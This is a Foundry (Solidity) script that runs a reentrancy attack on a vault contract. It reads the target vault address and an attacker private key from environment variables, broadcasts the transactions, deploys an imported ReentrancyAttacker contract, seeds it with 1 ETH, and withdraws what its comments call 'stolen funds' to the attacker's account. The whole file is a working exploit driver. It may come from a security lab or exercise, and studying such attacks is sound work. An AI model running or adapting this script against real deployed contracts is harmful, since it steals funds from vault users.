// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../src/attacker/ReentrancyAttacker.sol";

contract ExecuteAttack is Script {
    function run() external {
        address vaultAddr = vm.envAddress("VAULT_ADDRESS");
        uint256 attackerKey = vm.envUint("ATTACKER_KEY");

        vm.startBroadcast(attackerKey);

        ReentrancyAttacker attacker = new ReentrancyAttacker(vaultAddr);
        console.log("Attacker deployed at:", address(attacker));

        // Attack with 1 ETH seed
        attacker.attack{value: 1 ether}();
        console.log("Attack executed. Attacker balance:", address(attacker).balance);

        // Withdraw stolen funds
        attacker.withdraw();
        console.log("Funds withdrawn to attacker EOA");

        vm.stopBroadcast();
    }
}
